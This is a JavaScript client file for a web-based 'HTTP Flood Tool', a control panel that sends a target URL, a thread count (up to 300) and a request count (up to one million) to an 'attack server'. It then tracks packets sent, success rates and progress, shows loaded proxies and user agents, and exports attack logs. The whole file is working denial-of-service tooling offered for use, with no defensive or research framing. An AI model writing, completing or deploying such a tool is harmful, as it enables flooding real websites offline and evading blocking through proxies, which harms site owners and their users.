class HTTPFloodController {
    constructor() {
        this.socket = null;
        this.currentAttackId = null;
        this.stats = {
            sent: 0,
            successful: 0,
            failed: 0,
            startTime: null
        };
        this.autoScroll = true;
        this.initializeSocket();
        this.bindEvents();
        this.updateSystemInfo();
        this.addLog('System initialized. Ready to start attacks.', 'system');
    }

    initializeSocket() {
        this.socket = io();
        
        this.socket.on('connect', () => {
            this.addLog('Connected to attack server', 'success');
            document.getElementById('startBtn').disabled = false;
        });

        this.socket.on('attack_started', (data) => {
            this.currentAttackId = data.attackId;
            this.stats.startTime = Date.now();
            this.addLog(`Attack started against ${data.target}`, 'success');
            document.getElementById('startBtn').disabled = true;
            document.getElementById('stopBtn').disabled = false;
            this.updateUI();
        });

        this.socket.on('packet_sent', (data) => {
            this.stats.sent++;
            this.stats.successful++;
            this.updateStats();
            
            if (this.stats.sent % 100 === 0) {
                this.addLog(`Packet ${this.stats.sent} sent to ${data.target}`, 'info');
            }
        });

        this.socket.on('packet_error', (data) => {
            this.stats.sent++;
            this.stats.failed++;
            this.updateStats();
            
            if (this.stats.failed % 50 === 0) {
                this.addLog(`Packet ${this.stats.sent} failed: ${data.error}`, 'error');
            }
        });

        this.socket.on('attack_progress', (data) => {
            if (data.attackId === this.currentAttackId) {
                const progress = data.progress;
                const progressFill = document.getElementById('progressFill');
                const progressText = document.getElementById('progressText');
                const requestsText = document.getElementById('requestsText');
                
                progressFill.style.width = `${progress}%`;
                progressText.textContent = `${progress}% Complete`;
                requestsText.textContent = `${data.sent} / ${this.getTotalRequests()} Requests`;
                
                document.getElementById('successCount').textContent = data.successful;
                document.getElementById('failedCount').textContent = data.failed;
                document.getElementById('remainingCount').textContent = this.getTotalRequests() - data.sent;
                
                this.updateDuration();
            }
        });

        this.socket.on('attack_complete', (data) => {
            this.addLog(`Attack completed. Total: ${data.summary.totalSent} requests`, 'success');
            document.getElementById('startBtn').disabled = false;
            document.getElementById('stopBtn').disabled = true;
            this.updateDuration();
        });

        this.socket.on('attack_stopped', (data) => {
            this.addLog(`Attack stopped: ${data.message}`, 'info');
            document.getElementById('startBtn').disabled = false;
            document.getElementById('stopBtn').disabled = true;
        });

        this.socket.on('attack_error', (data) => {
            this.addLog(`Attack error: ${data.error}`, 'error');
            document.getElementById('startBtn').disabled = false;
            document.getElementById('stopBtn').disabled = true;
        });

        this.socket.on('disconnect', () => {
            this.addLog('Disconnected from server', 'error');
            document.getElementById('startBtn').disabled = true;
        });
    }

    bindEvents() {
        // Start Attack Button
        document.getElementById('startBtn').addEventListener('click', () => {
            const targetUrl = document.getElementById('targetUrl').value.trim();
            const threads = parseInt(document.getElementById('threads').value);
            const totalRequests = parseInt(document.getElementById('requests').value);
            
            if (!targetUrl) {
                this.addLog('Please enter a target URL', 'error');
                return;
            }
            
            if (!targetUrl.startsWith('http')) {
                this.addLog('URL must start with http:// or https://', 'error');
                return;
            }
            
            this.resetStats();
            this.socket.emit('start_attack', {
                targetUrl: targetUrl,
                threads: Math.min(threads, 300),
                totalRequests: Math.min(totalRequests, 1000000)
            });
            
            this.addLog(`Starting attack with ${threads} threads...`, 'system');
        });

        // Stop Attack Button
        document.getElementById('stopBtn').addEventListener('click', () => {
            if (this.currentAttackId) {
                this.socket.emit('stop_attack', {
                    attackId: this.currentAttackId
                });
            }
        });

        // Clear Logs Button
        document.getElementById('clearBtn').addEventListener('click', () => {
            document.getElementById('logContent').innerHTML = '';
            this.addLog('Logs cleared', 'system');
        });

        // Auto-scroll Toggle
        document.getElementById('autoScrollBtn').addEventListener('click', (e) => {
            this.autoScroll = !this.autoScroll;
            e.target.classList.toggle('btn-active');
            this.addLog(`Auto-scroll ${this.autoScroll ? 'enabled' : 'disabled'}`, 'system');
        });

        // Export Logs Button
        document.getElementById('exportLogsBtn').addEventListener('click', () => {
            this.exportLogs();
        });
    }

    addLog(message, type = 'info') {
        const logContainer = document.getElementById('logContent');
        const logEntry = document.createElement('div');
        
        const time = new Date().toLocaleTimeString();
        const typeClass = type;
        
        logEntry.className = `log-entry ${typeClass}`;
        logEntry.innerHTML = `
            <span class="log-time">[${time}]</span>
            <span class="log-message">${message}</span>
        `;
        
        logContainer.appendChild(logEntry);
        
        if (this.autoScroll) {
            logContainer.scrollTop = logContainer.scrollHeight;
        }
    }

    updateStats() {
        document.getElementById('totalPackets').textContent = this.stats.sent.toLocaleString();
        document.getElementById('activeAttacks').textContent = this.currentAttackId ? '1' : '0';
        
        const successRate = this.stats.sent > 0 
            ? Math.round((this.stats.successful / this.stats.sent) * 100) 
            : 0;
        document.getElementById('successRate').textContent = `${successRate}%`;
    }

    updateUI() {
        const progressFill = document.getElementById('progressFill');
        const progressText = document.getElementById('progressText');
        const requestsText = document.getElementById('requestsText');
        
        progressFill.style.width = '0%';
        progressText.textContent = '0% Complete';
        requestsText.textContent = `0 / ${this.getTotalRequests()} Requests`;
        
        document.getElementById('successCount').textContent = '0';
        document.getElementById('failedCount').textContent = '0';
        document.getElementById('remainingCount').textContent = this.getTotalRequests();
        document.getElementById('duration').textContent = '0s';
    }

    updateDuration() {
        if (this.stats.startTime) {
            const duration = Math.floor((Date.now() - this.stats.startTime) / 1000);
            document.getElementById('duration').textContent = `${duration}s`;
        }
    }

    resetStats() {
        this.stats = {
            sent: 0,
            successful: 0,
            failed: 0,
            startTime: null
        };
        this.updateStats();
        this.updateUI();
    }

    getTotalRequests() {
        return parseInt(document.getElementById('requests').value) || 1000000;
    }

    updateSystemInfo() {
        fetch('/api/system/info')
            .then(response => response.json())
            .then(data => {
                document.getElementById('uaCount').textContent = data.userAgentsLoaded;
                document.getElementById('proxyCount').textContent = data.proxiesLoaded;
            })
            .catch(error => {
                console.error('Failed to load system info:', error);
            });
    }

    exportLogs() {
        const logEntries = document.querySelectorAll('.log-entry');
        let logText = 'HTTP Flood Tool - Attack Logs\n';
        logText += '='.repeat(50) + '\n\n';
        
        logEntries.forEach(entry => {
            const time = entry.querySelector('.log-time').textContent;
            const message = entry.querySelector('.log-message').textContent;
            logText += `${time} ${message}\n`;
        });
        
        const blob = new Blob([logText], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `http-flood-logs-${new Date().toISOString().split('T')[0]}.txt`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        
        this.addLog('Logs exported successfully', 'success');
    }
}

// Initialize the application when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    window.floodController = new HTTPFloodController();
});